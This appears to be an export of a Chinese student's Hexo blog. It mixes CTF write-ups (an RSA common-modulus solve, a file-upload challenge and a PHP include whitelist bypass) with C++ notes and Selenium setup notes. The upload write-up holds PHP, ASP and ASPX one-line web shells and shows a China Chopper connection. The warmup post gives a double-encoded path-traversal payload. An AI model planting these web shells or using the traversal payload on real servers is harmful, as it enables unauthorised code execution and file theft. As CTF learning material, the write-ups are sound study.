RSA.importKey(open(<span class="string">r&quot;G:\ctf\CTF题目\c2d6e7158d7b4cd6a747774f0bdc5f72\publickey2.pem&quot;</span>,<span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line"><span class="comment">#int型</span></span><br><span class="line">n1 = public_key1.n</span><br><span class="line">e1 = public_key1.e</span><br><span class="line">n2 = public_key2.n</span><br><span class="line">e2 = public_key2.e</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> n1==n2</span><br><span class="line">n=n1</span><br><span class="line"></span><br><span class="line"><span class="comment">#若直接给出e1、e2、n</span></span><br><span class="line"><span class="comment"># e1 = 117</span></span><br><span class="line"><span class="comment"># e2 = 65537</span></span><br><span class="line"><span class="comment"># n =0x67755F890795644EC27E68892B94042C78334C34F9A6D8B6AA488D9B424D64A8B9B2DCC91B1D098A09D7AC4F9A06A4B5267F88F8968B4BAD29235D9A80330845F126B9A865F44C7A77DF72F763F553E99020745F40C8D97F0AB906154FBB1020B588F441F712B2377505B644FE36A78743EE4995B42C7B17B8DF4782EBB595097EE1BE74143261893C4EE2C140DC469E32B17F8AB30E25F07164506B4E79C6B4E3AF5BEA0268427FFB1134FB90A5122729C4EEF17B6D0B12CFBA4E7F14E27AA3C2B4F978E75163242EBD5CBD73829336F9A120E86E25D69CAE0229FDCCEB5B35DC630187B0EEF1532EEC546F4037A6EAB0D0207199B9566011A52F8E9ACD7261</span></span><br><span class="line"></span><br><span class="line">c1=bytes_to_long(open(<span class="string">r&#x27;G:\ctf\CTF题目\c2d6e7158d7b4cd6a747774f0bdc5f72\cipher1.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read())  </span><br><span class="line">c2=bytes_to_long(open(<span class="string">r&#x27;G:\ctf\CTF题目\c2d6e7158d7b4cd6a747774f0bdc5f72\cipher2.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()) </span><br><span class="line"></span><br><span class="line">_, r, s = gmpy2.gcdext(e1, e2)</span><br><span class="line"></span><br><span class="line">m = pow(c1, r, n) * pow(c2, s, n) % n</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="/2020/10/12/best-rsa/image-20201012112318371.png" alt="image-20201012112318371"></p>
<p>得到flag为：flag{interesting_rsa}</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>CRYPTO</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>同模攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>c&amp;c++</title>
    <url>/2020/11/02/c-c/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>通常我们对类成员进行“初始化”有两种方式：</p>
<ol>
<li>构造函数后面跟冒号；</li>
<li>构造函数里面对成员进行赋值。</li>
</ol>
<a id="more"></a>

<hr>
<p>const和引用必须在声明的时候就初始化，换句话说就是在给const和引用类型变量分配内存的时候就初始化。</p>
<hr>
<p>根据C++的规则，const类型和引用不可以被赋值，只能被初始化。</p>
<hr>
<p>实在构造函数里面调用等于号并不是真正意义上的“初始化”。这个过程相当于：</p>
<ol>
<li>系统创建成员变量；</li>
<li>创建完后再进行赋值操作。</li>
</ol>
<p>而在构造函数后面跟冒号，就相当于：</p>
<ol>
<li>系统创建成员变量并且初始化。也就是系统为成员变量分配了一块内存并且把相应的数据给填了进去。而构造函数里面调用等于号的方式是分配好后再进行赋值，多了一个步骤。</li>
</ol>
<p><strong>构造函数后面跟的冒号代码是在进入构造函数并且在括号里面的第一行代码之前被执行。</strong></p>
<p><strong>通俗的讲，构造函数后面的冒号就是初始化，而括号里面的等于号并不是初始化，而是变量生成以后的赋值而已（永远都是2个步骤）。</strong></p>
<p><strong>引用b初始化完成后，就永远指向初始化时候的那个变量，无法再改变了。</strong>我这里的“引用不可以被赋值”是指不能给引用本身赋值来改变它的指向，并不是说不可以改变引用指向的内存的内容。</p>
<hr>
<p>数组名是指向数组中第一个元素的常量指针</p>
]]></content>
      <categories>
        <category>C&amp;C++</category>
      </categories>
      <tags>
        <tag>notes</tag>
      </tags>
  </entry>
  <entry>
    <title>Confusion and thinking</title>
    <url>/2020/11/04/confusion/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本篇文章记录一下学习过程中遇到的一些问题和思考？仅此记录一下，或许随着不断地成长都会得到答案😮</p>
<a id="more"></a>

<ol>
<li>leetcode题要把题解都过一遍然后分析寻找最优解吗？学的更好但需要时间更多，还是说多刷题，量变产生质变？</li>
<li>目前还比较菜，LeetCode周赛有必要参加吗，参加了有必要写题解吗？中等题有一定挑战，难题根本没做过。选择：先刷简单题，参加周赛但是题解</li>
</ol>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
  </entry>
  <entry>
    <title>Encouragement</title>
    <url>/2020/11/04/encouragement/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这篇文章放一些鸡汤吧，觉得看完还是能燃起斗志的，失落迷茫时看看吧😗</p>
<a id="more"></a>

<p>1</p>
<iframe src="//player.bilibili.com/player.html?aid=89823016&bvid=BV1Y741177jt&cid=153411753&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>







<p>2</p>
<iframe src="//player.bilibili.com/player.html?aid=40885499&bvid=BV1Vt411p7RC&cid=71807757&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

<p>3</p>
<iframe src="//player.bilibili.com/player.html?aid=24486739&bvid=BV12W411A7dj&cid=41124302&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

<p>4</p>
<iframe src="//player.bilibili.com/player.html?aid=839716400&bvid=BV1754y1172R&cid=239329026&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

<p>5</p>
<iframe src="//player.bilibili.com/player.html?aid=837773988&bvid=BV1Cg4y187uN&cid=181357145&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

<p>6</p>
<iframe src="//player.bilibili.com/player.html?aid=81913831&bvid=BV1rJ411j7ym&cid=140164477&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

<p>7</p>
<iframe src="//player.bilibili.com/player.html?aid=79350389&bvid=BV1gJ411k7Ts&cid=135791676&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

<p>8</p>
<iframe src="//player.bilibili.com/player.html?aid=62372508&bvid=BV1dt411M7xH&cid=108408326&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

<p>9</p>
<iframe src="//player.bilibili.com/player.html?aid=3523138&bvid=BV1Ms411R7zH&cid=5603916&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

<p>10</p>
<iframe src="//player.bilibili.com/player.html?aid=200415421&bvid=BV1Tz411z7fS&cid=182472419&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

]]></content>
      <categories>
        <category>其他</category>
      </categories>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/10/09/hello-world/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<a id="more"></a>

<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>linux下使用selenium模块</title>
    <url>/2020/11/03/linux%E4%B8%8B%E4%BD%BF%E7%94%A8selenium%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h6 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h6><p>因为要在linux服务器上使用selenium模块实现“自动信息上报”的需求，在把python代码部署到linux服务器上的时候出现了一些环境配置上的问题，在一台服务器上摸索了好久也没成功问题一个接一个，难受😫，然后我就又重新缕清头绪在另一台服务器上重新部署了一下，成功了以后仅此记录一下，其他linux系统以后再摸索摸索吧😛</p>
<a id="more"></a>

<p><strong>查看linux版本</strong></p>
<p>我的系统是Red Hat 4.8.5。</p>
<p>命令：<code>cat /proc/version</code></p>
<p><img src="/2020/11/03/linux%E4%B8%8B%E4%BD%BF%E7%94%A8selenium%E6%A8%A1%E5%9D%97/image-20201103220335294.png" alt="image-20201103220335294"></p>
<p><strong>安装selenium模块</strong>（前提是已经装好了python3环境）</p>
<p>命令：<code>pip3 install selenium</code></p>
<p><strong>安装chrome</strong></p>
<p>命令：<code>yum install https://dl.google.com/linux/direct/google-chrome-stable_current_x86_64.rpm</code></p>
<p>这个命令是下载安装最新的稳定的chrome版本，不是固定的版本，所以要注意下载chromedriver时要对应版本</p>
<p>我是在本地win10系统又下了一遍，解压可以看到chrome版本是86</p>
<p><img src="/2020/11/03/linux%E4%B8%8B%E4%BD%BF%E7%94%A8selenium%E6%A8%A1%E5%9D%97/image-20201103221418515.png" alt="image-20201103221418515"></p>
<p>注：如果运行程序出错：Cannot find Chrome binary，就是没有安装chrome</p>
<p><strong>安装依赖库</strong></p>
<p>命令：<code>yum install pango.x86_64 libXcomposite.x86_64 libXcursor.x86_64 libXdamage.x86_64 libXext.x86_64 libXi.x86_64 libXtst.x86_64 cups-libs.x86_64 libXScrnSaver.x86_64 libXrandr.x86_64 GConf2.x86_64 alsa-lib.x86_64 atk.x86_64 gtk3.x86_64 -y</code></p>
<p>注：如果没有安装依赖库会报错：error while loading shared libraries: libX11.so.6:</p>
<p><strong>安装chromedriver</strong>（驱动程序）</p>
<p>下载链接如下：<a href="http://chromedriver.storage.googleapis.com/index.html">点我下载</a>，一定要找到与上面chrome版本相应的版本，这里下载和上面对应的86版本</p>
<p><img src="/2020/11/03/linux%E4%B8%8B%E4%BD%BF%E7%94%A8selenium%E6%A8%A1%E5%9D%97/image-20201103221931864.png" alt="image-20201103221931864"></p>
<p>可以windows下载后然后传到服务器上，也可以直接使用wget命令下载</p>
<p>命令：<code>wget  http://chromedriver.storage.googleapis.com/index.html?path=86.0.4240.22/</code></p>
<p>然后给chromedriver 文件赋予可执行权限</p>
<p>命令：<code>chmod +x chromedriver</code> </p>
<p>然后放到环境变量PATH路径中</p>
<p>命令：<code>cp chromedriver /usr/bin/</code></p>
<p>可以查看chromedriver的版本号</p>
<p>命令：<code>chromedriver --version</code><img src="/2020/11/03/linux%E4%B8%8B%E4%BD%BF%E7%94%A8selenium%E6%A8%A1%E5%9D%97/image-20201103222408841.png" alt="image-20201103222408841"></p>
<p><strong>selenium代码测试</strong></p>
<p>在服务器上新建一个python文件，写入以下代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line">ch_options = webdriver.ChromeOptions()</span><br><span class="line"><span class="comment">#为Chrome配置无头模式</span></span><br><span class="line">ch_options.add_argument(<span class="string">&quot;--headless&quot;</span>)  </span><br><span class="line">ch_options.add_argument(<span class="string">&#x27;--no-sandbox&#x27;</span>)</span><br><span class="line">ch_options.add_argument(<span class="string">&#x27;--disable-gpu&#x27;</span>)</span><br><span class="line">ch_options.add_argument(<span class="string">&#x27;--disable-dev-shm-usage&#x27;</span>)</span><br><span class="line"><span class="comment"># 在启动浏览器时加入配置</span></span><br><span class="line">dr = webdriver.Chrome(options=ch_options)</span><br><span class="line"><span class="comment">#这是测试网站</span></span><br><span class="line">url = <span class="string">&quot;https://www.baidu.com&quot;</span></span><br><span class="line">dr.get(url)</span><br><span class="line"><span class="comment">#打印源码</span></span><br><span class="line">print(dr.page_source)</span><br></pre></td></tr></table></figure>

<p>然后python执行这个py文件，结果打印出了源码，即selenium模块环境配置成功。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>环境配置</tag>
        <tag>Red Hat</tag>
      </tags>
  </entry>
  <entry>
    <title>test_MISC</title>
    <url>/2020/10/10/test-MISC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这只是一篇MISC分类的测试文章</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>test_PWN</title>
    <url>/2020/10/11/test-PWN/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这只是一篇PWN分类的测试文章</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PWN</category>
      </categories>
  </entry>
  <entry>
    <title>test_REVERSE</title>
    <url>/2020/10/11/test-REVERSE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这只是一篇REVERSE分类的测试文章</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>REVERSE</category>
      </categories>
  </entry>
  <entry>
    <title>test_WEB</title>
    <url>/2020/10/11/test-WEB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这只是一篇WEB分类的测试文章</p>
<p>aplayer测试：</p>

    <div id="aplayer-XWOwYpyT" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="001xLIXo2w9V7U" data-server="tencent" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"></div>

<p>dplayer测试：</p>
<div id="dplayer0" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer0"),"hotkey":true,"preload":"metadata","video":{"url":"http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script> 
]]></content>
      <categories>
        <category>CTF</category>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>test_acm</title>
    <url>/2020/10/11/test-acm/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这是ACM分类的测试文章</p>
]]></content>
      <categories>
        <category>ACM</category>
      </categories>
  </entry>
  <entry>
    <title>test_schedule</title>
    <url>/2020/10/11/test-schedule/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script>]]></content>
  </entry>
  <entry>
    <title>upoload1</title>
    <url>/2020/10/23/upoload1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4822&page=1">题目地址</a></p>
<p><strong>题目名称</strong>：upload1</p>
<p><strong>题目描述：</strong>暂无</p>
<a id="more"></a>

<h5 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp:"></a>WriteUp:</h5><h6 id="上传一句话木马"><a href="#上传一句话木马" class="headerlink" title="上传一句话木马"></a><strong>上传一句话木马</strong></h6><p>看题目名称应该就知道是文件上传了，创建场景，点击链接页面如下：</p>
<p><img src="/2020/10/23/upoload1/image-20201023164335571.png" alt="image-20201023164335571"></p>
<p>先选择一个php后缀文件上传，提示要上传图片</p>
<p><img src="/2020/10/23/upoload1/image-20201023164418341.png" alt="image-20201023164418341"></p>
<p>上传一张jpg后缀图片上传，没有反应应该是上传成功了，新建一个文本文件，内容为php一句话木马：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;pass&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>把文件后缀改成jpg格式，选择文件然后点击上传并用burpsuite工具抓包（浏览器需开代理）</p>
<p><img src="/2020/10/23/upoload1/image-20201023164914678.png" alt="image-20201023164914678"></p>
<p>然后把文件名.jpg后缀去掉，发送请求，可以看到一句话木马上传成功，存储路径为：upload/1603442923.upload.php</p>
<p><img src="/2020/10/23/upoload1/image-20201023165129136.png" alt="image-20201023165129136"></p>
<h6 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h6><p>打开“中国菜刀”工具，添加url，配置如下：</p>
<p><img src="/2020/10/23/upoload1/image-20201023165654178.png" alt="image-20201023165654178"></p>
<p>双击这个url就可以连接到服务器了，可以看到我们上传的内容，其中就有我们的一句话木马文件（我这里是上传过很多次）</p>
<p><img src="/2020/10/23/upoload1/image-20201023165810390.png" alt="image-20201023165810390"></p>
<p>当前目录的上级目录就包含flag.php文件，打开后得到flag</p>
<p><img src="/2020/10/23/upoload1/image-20201023165924077.png" alt="image-20201023165924077"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">&quot;cyberpeace&#123;5bcd10d9509d29e1df1ff237b06e51e4&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>开始上传php后缀文件失败，提示上传一张图片，而把php文件中的内容不变只加了个jpg后缀就上传成功了，是因为上传文件的判断是在前端进行的，只检测了上传文件的后缀，并没有对文件真正的格式进行校验，所以使用burpsuite代理就可以轻松绕过前端校验。</p>
<p>以前做java后台开发的时候还在疑惑前端已经校验了表单传过来的数据，后端还要再校验一次吗？？？现在就很清楚了，只要是前端校验的东西都可以通过代理绕过。</p>
<h5 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a><strong>知识点</strong></h5><p><strong>中国菜刀：</strong></p>
<p>中国菜刀，是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理！在主视图中右键/添加，在弹出的对话框中输入服务端地址，连接的密码(请注意上例中的pass字串)，选择正确的脚本类型和语言编码，保存后即可使用文件管理，虚拟终端，数据库管理三大块功能。</p>
<p><strong>一句话木马：</strong></p>
<ul>
<li><p>“一句话木马”服务端（是用于本地的html提交脚本木马文件）<br>就是我们要用来插入到asp文件中的asp语句，（不仅仅是以asp为后缀的数据库文件），该语句将回为触发，接收入侵者通过客户端提交的数据，执行并完成相应的操作，服务端的代码内容为 &lt;%execute request(“value”)%&gt; 其中value可以自己修改</p>
</li>
<li><p>“一句话木马”客户端（远程服务器上被插入一句话的asp可执行文件）<br>用来向服务端提交控制数据的，提交的数据通过服务端构成完整的asp功能语句并执行，也就是生成我们所需要的asp木马文件 &lt;%execute(request(“value”))%&gt;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">asp一句话木马：</span><br><span class="line">	&lt;%execute(request(&quot;value&quot;))%&gt;</span><br><span class="line">php一句话木马：</span><br><span class="line">	&lt;?php @eval($_POST[value]);?&gt;</span><br><span class="line">aspx一句话木马：</span><br><span class="line">	&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;</span><br><span class="line">	&lt;%eval(Request.Item[&quot;value&quot;])%&gt;</span><br></pre></td></tr></table></figure>

</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>warmup</title>
    <url>/2020/10/17/warmup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5442&page=1">题目地址</a></p>
<p>题目名称：warmup</p>
<p>题目描述：暂无</p>
<p>题目附件：暂无</p>
<a id="more"></a>

<p><strong>题外话：</strong></p>
<p>这两天做RSA题没做出来，看WriteUp发现RSA的原理自己还不太懂，题解也不太懂，好菜啊难受，，还是需要很多数学公式的，头都大了，先放一放吧，先做一道web放松一下。</p>
<p>WriteUp:</p>
<p>创建场景访问后的页面如下：</p>
<p><img src="/2020/10/17/warmup/image-20201017191236773.png" alt="image-20201017191236773"></p>
<p>啥也没有，只有一个大表情，查看源码，提示&lt;!–source.php–&gt;</p>
<p><img src="/2020/10/17/warmup/image-20201017191619814.png" alt="image-20201017191619814"></p>
<p>source.php源码页面分析如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);<span class="comment">#函数对文件进行语法高亮显示。</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;<span class="comment">#必须传参$page,且参数是字符串，否则返回false</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;<span class="comment">#如果参数在白名单里面 返回true</span></span><br><span class="line">			</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(<span class="comment">#截取参数第一个？之前的字符串返回，</span></span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);<span class="comment">#对参数进行url解码</span></span><br><span class="line">            $_page = mb_substr(<span class="comment">#解码后截取第一个？之前的字符串返回</span></span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;<span class="comment">#如果在白名单里返回True</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;<span class="comment">#返回false</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">#php类并不会执行（除非调用），从这开始执行</span></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">	<span class="comment">#判断为真的条件，file参数非空；file参数是字符串；checkFile返回结果为True</span></span><br><span class="line">	<span class="comment">#返回file参数的文件源码</span></span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];<span class="comment">#把包含的文件读取进来</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到还有一个hint.php，查看内容如下：</p>
<p><img src="/2020/10/17/warmup/image-20201017193107533.png" alt="image-20201017193107533"></p>
<p>根据猜测flag在得到了一个ffffllllaaaagggg文件中，source.php源码中有include语句。所以要把ffffllllaaaagggg文件的路径传入file参数中。</p>
<p>在本地使用wamp集成服务器组件搭建了一个php环境，一通测试分析之后如下：</p>
<ul>
<li><p>在地址栏需要file传参</p>
</li>
<li><p>file参数值经过checkFile函数返回值要为true</p>
</li>
<li><p>file参数值还要是ffffllllaaaagggg文件的路径</p>
</li>
</ul>
<p>根据checkfile函数构造payload为：</p>
<p><code>?file=source.php%253f/../../../../ffffllllaaaagggg</code></p>
<p>因为%253f是’?’字符两次url编码后的值</p>
<p>因为url有一次自动url解码，第一次mb_substr时无变化，然后通过urldecode函数变成了?file=source.php?/../../../../ffffllllaaaagggg,然后截取?之前的参数正好是source.php结果返回true，而正好构造的payload是ffffllllaaaagggg的路径，../的个数是逐次添加尝试得到的结果，如下：</p>
<p><img src="/2020/10/17/warmup/image-20201017195308183.png" alt="image-20201017195308183"></p>
<p><strong>原理：</strong></p>
<p>include语句会包含url自动解码后的source.php%3f/../../../../ffffllllaaaagggg，而会从php根目录source.php%3f文件开始一个../是一个上级目录，最后访问到ffffllllaaaagggg文件</p>
<p><strong>另外：</strong></p>
<p>下面这两个payload也可以访问，不知道为什么？</p>
<p><code>?file=source.php?../../../../../ffffllllaaaagggg</code></p>
<p><code>?file=source.php?/../../../../ffffllllaaaagggg</code></p>
<p>我再本地测试”source.php?/../“这样写的的话是不能访问上级目录的，好像不会把source.php?当成一个文件名，?会当成传参符号，也不知道为什么可以访问到，也不纠结了😬</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WEB</category>
      </categories>
      <tags>
